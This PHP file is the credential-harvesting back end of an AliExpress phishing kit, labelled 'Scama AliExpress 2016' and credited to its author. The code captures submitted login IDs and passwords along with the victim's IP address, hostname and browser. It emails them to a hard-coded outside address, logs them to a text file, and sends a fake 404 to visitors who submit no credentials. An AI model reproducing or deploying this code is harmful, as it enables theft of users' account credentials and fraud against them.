<?php
/////
//
//     Scama AliExpress 2016
//  
//   Coded By Achroufa 
//
//   Facebook : https://www.facebook.com/achraf.mkaoua/
//
//  
//
/////
if (isset($_POST['loginid']) && $_POST['loginid'] != "") {
	$ip = getenv("REMOTE_ADDR");
	$message .= "-------------- 3liexpress ^_^ Login Infos  -------------\n";
	$message .= "Email Or User ID  : ".$_POST['loginid']."\n";
	$message .= "Password : ".$_POST['password']."\n";
	$message .= "-------------- IP Tracing ------------\n";
	$message .= "IP      : $ip\n";
	$message .= "Host    : ".gethostbyaddr($ip)."\n";
	$message .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
	$message .= "---------- Coded By achroufa ---------\n";
	$subject = "Login :* | $ip | ".$_POST['loginid'];
	$send = "om12sg@hotmail.com"; //Put You Email Here
	$headers = 'From: 4aliexpress' . "\r\n";
	mail($send,$subject,$message,$headers);
	$file = fopen("rzlt.txt", 'a');
    fwrite($file, $message);
	echo '<META HTTP-EQUIV="Refresh" Content="0; URL=../details.php?Step1_aliexpress-update=df4cc48c24121eeede7ae5585f4692fb34fc">';  
}else{
	header("HTTP/1.0 404 Not Found");
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}

?>